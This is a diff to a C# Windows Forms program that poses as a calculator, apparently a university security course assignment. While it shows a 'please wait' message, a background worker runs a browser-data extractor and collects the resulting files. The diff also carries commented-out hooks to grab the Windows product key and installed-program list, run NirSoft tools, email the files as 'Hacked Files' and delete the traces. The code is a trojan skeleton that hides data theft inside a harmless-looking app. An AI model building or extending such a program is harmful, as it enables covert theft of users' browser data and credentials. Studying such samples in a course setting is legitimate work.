@@ -8,9 +8,20 @@ namespace TP
 {
     public partial class Form1 : Form
     {
+        protected List<DataExtractor> dataExtractors;
+
+        protected List<string> nirsoftExecutablePaths;
+
         public Form1()
         {
             InitializeComponent();
+            dataExtractors = new List<DataExtractor>();
+            //dataExtractors.Add(new WindowsProductKeyDataExtractor("productKey"));
+            //dataExtractors.Add(new ProgramsListDataExtractor("programsList"));
+            dataExtractors.Add(new BrowserDataExtractor("browsersData"));
+
+            nirsoftExecutablePaths = new List<string>();
+            //nirsoftExecutablePaths.Add("awatch.exe");
         }
 
         #region Calculadora
@@ -94,24 +105,14 @@ namespace TP
                 dotCount = 0;
 
         }
-#endregion
+        #endregion
 
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
             Console.WriteLine("Abriendo calculadora. Por favor espere...");
-            //List<string> files = new List<string>();
-
-
-
-            List<DataExtractor> dataExtractors = new List<DataExtractor>();
-            dataExtractors.Add(new BrowserDataExtractor());
-            List<string> files = Helpers.applyDataExtractionActions(dataExtractors);
-
-            //files.NirsoftToolExecAndAdd("awatch.exe");
-
-            //files.Add(path);
-            //files.Add(@"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt");
+            List<string> files = Helpers.applyDataExtractionActions(dataExtractors, nirsoftExecutablePaths);
             //Helpers.sendMail("Hack Test", "Hacked Files", files);
+            //Helpers.RemoveFiles(files);
         }
 
         private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
